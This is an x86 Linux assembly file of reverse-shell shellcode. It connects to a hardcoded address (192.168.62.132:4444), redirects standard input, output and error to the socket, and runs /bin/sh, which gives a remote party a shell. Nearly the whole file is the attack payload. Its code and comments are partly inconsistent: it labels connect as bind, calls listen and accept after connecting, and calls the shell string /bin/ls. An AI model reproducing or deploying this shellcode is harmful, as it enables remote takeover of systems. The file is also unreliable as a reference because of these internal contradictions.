;Title: Shell Reverse TCP code
;Author: evil_comrade
;
;

global _start
section .text
_start:

; socket(int domain, int type, int protocol);
; s = socket(2, 1, 0)
	xor eax, eax	; zero out eax register
	mov al, 0x66	; mov 0x66 (102 socketcall) into eax register
	xor ebx, ebx    ; ebx carries the type of socketcall
	mov bl, 1	; which we saw from out net.h file is 1
	xor edx, edx	; Zero out edx . value of array are pushed in reverse order
	push edx        ; push zero onto the stack protocol = 0 (arg array build)
	push BYTE 1     ; push sockstream=1 value onto the stack 
	push BYTE 2     ; push AF_INET = 2 onto the stack
	mov ecx, esp    ; ecx = ptr to argument array
	int 0x80        ; After syscall, eax has socket file descriptor.

	mov esi, eax    ; move value of sock descriptor into esi 

; bind(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
; connect(s, [2, 4444, 192.168.62.132], 16)
	xor eax, eax    ; zero out eax register
	mov al, 0x66	; mov 0x66 (102 socketcall) into eax register
	mov bl, 2	; move 2 into ebx since SYS_BIND number from net.h is 2
	push edx        ; Build sockaddr struct: INADDR_ANY = 0
	push DWORD 0x843EA8c0 ; <-- IP address 192.168.62.132 (Incase you need to change the address)	
	push WORD 0x5c11; <-- port 4444 (Incase you need to change the port) pushed onto the stack in reverse order
	push WORD bx    ; push 2 onto the stack because AF_INET = 2
	mov ecx, esp    ; ecx = ptr to arguement array
	push BYTE 16    ;  size of server struct
	push ecx        
	push esi        
	mov ecx, esp
	inc ebx 	; ebx is now 3 which is SYS_CONNECT for connect()
	int 0x80       

; listen(int sockfd, int backlog);
; listen(s, 0)
	mov al, 0x66	 ;mov 0x66 (102 socketcall) into eax register
	inc ebx
	inc ebx          ; ebx is now 4 SYS_LISTEN = 4
	push ebx         ; 
	push esi         ;  
	mov ecx, esp     ; ecx = ptr to argument array
	int 0x80         
 
; accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
; c = accept(s, 0, 0)
	mov al, 0x66	  ; mov 0x66 (102 socketcall) into eax register
	inc ebx           ; ebx is now 5 since SYS_ACCEPT = 5
	push edx          ; argv: { socklen = 0, sockaddr ptr = NULL,socket fd }
	push edx
	push esi
	mov ecx, esp      ; ecx = ptr to argument array
	int 0x80          ;
; int dup2(int oldfd, int newfd);
; dup2(connected socket, {all three standard I/O file descriptors})
	mov ebx, eax      ; since the sockfd left off with EAX register we'll move it onto ebx
	xor eax, eax	  ; zero out the eax register and prepare to load it with dup2 syscall 
	mov al, 0x3F      ; dup2 syscall number is 63 
	xor ecx, ecx      ; load ecx with zero which is the value = standard input
	int 0x80          ;
	mov al,0x3F	  ; dup2 syscall is 63
	add ecx, 1	  ; add 1 to ecx = standard output
	int 0x80          ;
	mov al, 0x3F      ; dup2 syscall is 63
	add ecx,1         ; add 1 to ecx=2=standard error
	int 0x80          ;


; execve(const char *filename, char *const argv [], char *const envp[])
	; PUSH the first null dword 
	xor eax, eax
	push eax

	; PUSH //bin/sh loaded in reverse order (8 bytes) 
	push 0x68732f2f ;//sh 
	push 0x6e69622f ;/bin
	mov ebx, esp    ;because ebx points to the //bin/ls
	push eax        ; push 32bit null terminator to the stack
	mov edx, esp    ; empty array for envp
	push ebx        ; address of where //bin/ls is
	mov ecx, esp    ; this is the argv array with string ptr
	mov al, 11      ;syscall for execve
	int 0x80
